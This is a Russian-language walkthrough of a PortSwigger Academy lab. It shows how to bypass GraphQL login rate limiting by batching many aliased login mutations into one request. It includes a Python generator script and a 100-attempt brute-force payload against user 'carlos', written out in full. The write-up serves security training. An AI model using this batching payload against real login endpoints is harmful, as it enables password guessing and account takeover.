откроем уязвимый ресурс и попробуем залогиниться под юзером `carlos` со случайным паролем

Найдем данный запрос в `Proxy` -> `HTTP history`
```
POST /graphql/v1
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/4.%20Bypassing%20GraphQL%20brute%20force%20protections/pics%20for%20walkthrough/1.png)

Более того, при нескольких неудачных попыток аутентификации по рейтлимитам нас кидает в бан на 1 минуту
```
You have made too many incorrect login attempts. Please try again in 1 minute(s).
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/4.%20Bypassing%20GraphQL%20brute%20force%20protections/pics%20for%20walkthrough/2.png)

Причем заметим, если мы отправляем запросы последовательно - то рейтлимиты отрабатывают

А если отправим все в одном запросе последовательные попытки аутентификации - то рейтилимиты не сработают на примере данного запроса в расширении `InQL`

```
mutation {
    brut1: login(input: { password: "12345", username: "carlos" }) {
        token
        success
    }
    brut2: login(input: { password: "1", username: "carlos" }) {
        token
        success
    }
    brut3: login(input: { password: "12", username: "carlos" }) {
        token
        success
    }
    brut4: login(input: { password: "123", username: "carlos" }) {
        token
        success
    }
    brut5: login(input: { password: "1234", username: "carlos" }) {
        token
        success
    }
    brut6: login(input: { password: "123455", username: "carlos" }) {
        token
        success
    }
}
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/4.%20Bypassing%20GraphQL%20brute%20force%20protections/pics%20for%20walkthrough/3.png)

Воспользуемся этой особенностью и забрутим `carlos`'а согласно парольному словарю из `https://portswigger.net/web-security/authentication/auth-lab-passwords`


Напишем быдлокод, чтобы нам вручную не вбивать на питоне

```
passwd = '123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow'.split(',')
s = 'brut1: login(input: { password: "12345", username: "carlos" }) {\ntoken\nsuccess\n}'

for i in range (len(passwd)):
    news=s.replace('brut1',f'brut_{i}')
    newss=news.replace('12345',passwd[i])
    print(newss)
```

и получим следующий запрос для `InQL`
```
mutation {
    brut_0: login(input: { password: "123456", username: "carlos" }) {
        token
        success
    }
    brut_1: login(input: { password: "password", username: "carlos" }) {
        token
        success
    }
    brut_2: login(input: { password: "12345678", username: "carlos" }) {
        token
        success
    }
    brut_3: login(input: { password: "qwerty", username: "carlos" }) {
        token
        success
    }
    brut_4: login(input: { password: "123456789", username: "carlos" }) {
        token
        success
    }
    brut_5: login(input: { password: "12345", username: "carlos" }) {
        token
        success
    }
    brut_6: login(input: { password: "1234", username: "carlos" }) {
        token
        success
    }
    brut_7: login(input: { password: "111111", username: "carlos" }) {
        token
        success
    }
    brut_8: login(input: { password: "1234567", username: "carlos" }) {
        token
        success
    }
    brut_9: login(input: { password: "dragon", username: "carlos" }) {
        token
        success
    }
    brut_10: login(input: { password: "123123", username: "carlos" }) {
        token
        success
    }
    brut_11: login(input: { password: "baseball", username: "carlos" }) {
        token
        success
    }
    brut_12: login(input: { password: "abc123", username: "carlos" }) {
        token
        success
    }
    brut_13: login(input: { password: "football", username: "carlos" }) {
        token
        success
    }
    brut_14: login(input: { password: "monkey", username: "carlos" }) {
        token
        success
    }
    brut_15: login(input: { password: "letmein", username: "carlos" }) {
        token
        success
    }
    brut_16: login(input: { password: "shadow", username: "carlos" }) {
        token
        success
    }
    brut_17: login(input: { password: "master", username: "carlos" }) {
        token
        success
    }
    brut_18: login(input: { password: "666666", username: "carlos" }) {
        token
        success
    }
    brut_19: login(input: { password: "qwertyuiop", username: "carlos" }) {
        token
        success
    }
    brut_20: login(input: { password: "123321", username: "carlos" }) {
        token
        success
    }
    brut_21: login(input: { password: "mustang", username: "carlos" }) {
        token
        success
    }
    brut_22: login(input: { password: "1234567890", username: "carlos" }) {
        token
        success
    }
    brut_23: login(input: { password: "michael", username: "carlos" }) {
        token
        success
    }
    brut_24: login(input: { password: "654321", username: "carlos" }) {
        token
        success
    }
    brut_25: login(input: { password: "superman", username: "carlos" }) {
        token
        success
    }
    brut_26: login(input: { password: "1qaz2wsx", username: "carlos" }) {
        token
        success
    }
    brut_27: login(input: { password: "7777777", username: "carlos" }) {
        token
        success
    }
    brut_28: login(input: { password: "121212", username: "carlos" }) {
        token
        success
    }
    brut_29: login(input: { password: "000000", username: "carlos" }) {
        token
        success
    }
    brut_30: login(input: { password: "qazwsx", username: "carlos" }) {
        token
        success
    }
    brut_31: login(input: { password: "123qwe", username: "carlos" }) {
        token
        success
    }
    brut_32: login(input: { password: "killer", username: "carlos" }) {
        token
        success
    }
    brut_33: login(input: { password: "trustno1", username: "carlos" }) {
        token
        success
    }
    brut_34: login(input: { password: "jordan", username: "carlos" }) {
        token
        success
    }
    brut_35: login(input: { password: "jennifer", username: "carlos" }) {
        token
        success
    }
    brut_36: login(input: { password: "zxcvbnm", username: "carlos" }) {
        token
        success
    }
    brut_37: login(input: { password: "asdfgh", username: "carlos" }) {
        token
        success
    }
    brut_38: login(input: { password: "hunter", username: "carlos" }) {
        token
        success
    }
    brut_39: login(input: { password: "buster", username: "carlos" }) {
        token
        success
    }
    brut_40: login(input: { password: "soccer", username: "carlos" }) {
        token
        success
    }
    brut_41: login(input: { password: "harley", username: "carlos" }) {
        token
        success
    }
    brut_42: login(input: { password: "batman", username: "carlos" }) {
        token
        success
    }
    brut_43: login(input: { password: "andrew", username: "carlos" }) {
        token
        success
    }
    brut_44: login(input: { password: "tigger", username: "carlos" }) {
        token
        success
    }
    brut_45: login(input: { password: "sunshine", username: "carlos" }) {
        token
        success
    }
    brut_46: login(input: { password: "iloveyou", username: "carlos" }) {
        token
        success
    }
    brut_47: login(input: { password: "2000", username: "carlos" }) {
        token
        success
    }
    brut_48: login(input: { password: "charlie", username: "carlos" }) {
        token
        success
    }
    brut_49: login(input: { password: "robert", username: "carlos" }) {
        token
        success
    }
    brut_50: login(input: { password: "thomas", username: "carlos" }) {
        token
        success
    }
    brut_51: login(input: { password: "hockey", username: "carlos" }) {
        token
        success
    }
    brut_52: login(input: { password: "ranger", username: "carlos" }) {
        token
        success
    }
    brut_53: login(input: { password: "daniel", username: "carlos" }) {
        token
        success
    }
    brut_54: login(input: { password: "starwars", username: "carlos" }) {
        token
        success
    }
    brut_55: login(input: { password: "klaster", username: "carlos" }) {
        token
        success
    }
    brut_56: login(input: { password: "112233", username: "carlos" }) {
        token
        success
    }
    brut_57: login(input: { password: "george", username: "carlos" }) {
        token
        success
    }
    brut_58: login(input: { password: "computer", username: "carlos" }) {
        token
        success
    }
    brut_59: login(input: { password: "michelle", username: "carlos" }) {
        token
        success
    }
    brut_60: login(input: { password: "jessica", username: "carlos" }) {
        token
        success
    }
    brut_61: login(input: { password: "pepper", username: "carlos" }) {
        token
        success
    }
    brut_62: login(input: { password: "1111", username: "carlos" }) {
        token
        success
    }
    brut_63: login(input: { password: "zxcvbn", username: "carlos" }) {
        token
        success
    }
    brut_64: login(input: { password: "555555", username: "carlos" }) {
        token
        success
    }
    brut_65: login(input: { password: "11111111", username: "carlos" }) {
        token
        success
    }
    brut_66: login(input: { password: "131313", username: "carlos" }) {
        token
        success
    }
    brut_67: login(input: { password: "freedom", username: "carlos" }) {
        token
        success
    }
    brut_68: login(input: { password: "777777", username: "carlos" }) {
        token
        success
    }
    brut_69: login(input: { password: "pass", username: "carlos" }) {
        token
        success
    }
    brut_70: login(input: { password: "maggie", username: "carlos" }) {
        token
        success
    }
    brut_71: login(input: { password: "159753", username: "carlos" }) {
        token
        success
    }
    brut_72: login(input: { password: "aaaaaa", username: "carlos" }) {
        token
        success
    }
    brut_73: login(input: { password: "ginger", username: "carlos" }) {
        token
        success
    }
    brut_74: login(input: { password: "princess", username: "carlos" }) {
        token
        success
    }
    brut_75: login(input: { password: "joshua", username: "carlos" }) {
        token
        success
    }
    brut_76: login(input: { password: "cheese", username: "carlos" }) {
        token
        success
    }
    brut_77: login(input: { password: "amanda", username: "carlos" }) {
        token
        success
    }
    brut_78: login(input: { password: "summer", username: "carlos" }) {
        token
        success
    }
    brut_79: login(input: { password: "love", username: "carlos" }) {
        token
        success
    }
    brut_80: login(input: { password: "ashley", username: "carlos" }) {
        token
        success
    }
    brut_81: login(input: { password: "nicole", username: "carlos" }) {
        token
        success
    }
    brut_82: login(input: { password: "chelsea", username: "carlos" }) {
        token
        success
    }
    brut_83: login(input: { password: "biteme", username: "carlos" }) {
        token
        success
    }
    brut_84: login(input: { password: "matthew", username: "carlos" }) {
        token
        success
    }
    brut_85: login(input: { password: "access", username: "carlos" }) {
        token
        success
    }
    brut_86: login(input: { password: "yankees", username: "carlos" }) {
        token
        success
    }
    brut_87: login(input: { password: "987654321", username: "carlos" }) {
        token
        success
    }
    brut_88: login(input: { password: "dallas", username: "carlos" }) {
        token
        success
    }
    brut_89: login(input: { password: "austin", username: "carlos" }) {
        token
        success
    }
    brut_90: login(input: { password: "thunder", username: "carlos" }) {
        token
        success
    }
    brut_91: login(input: { password: "taylor", username: "carlos" }) {
        token
        success
    }
    brut_92: login(input: { password: "matrix", username: "carlos" }) {
        token
        success
    }
    brut_93: login(input: { password: "mobilemail", username: "carlos" }) {
        token
        success
    }
    brut_94: login(input: { password: "mom", username: "carlos" }) {
        token
        success
    }
    brut_95: login(input: { password: "monitor", username: "carlos" }) {
        token
        success
    }
    brut_96: login(input: { password: "monitoring", username: "carlos" }) {
        token
        success
    }
    brut_97: login(input: { password: "montana", username: "carlos" }) {
        token
        success
    }
    brut_98: login(input: { password: "moon", username: "carlos" }) {
        token
        success
    }
    brut_99: login(input: { password: "moscow", username: "carlos" }) {
        token
        success
    }
}
```

В поиске найдем значение `True` соответсвует `brut_11` а это соответсвует кредам `carlos:baseball`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/4.%20Bypassing%20GraphQL%20brute%20force%20protections/pics%20for%20walkthrough/4.png)

Зайдем под данными кредами и получим уведомление об успешно выполненной лабораторной работе
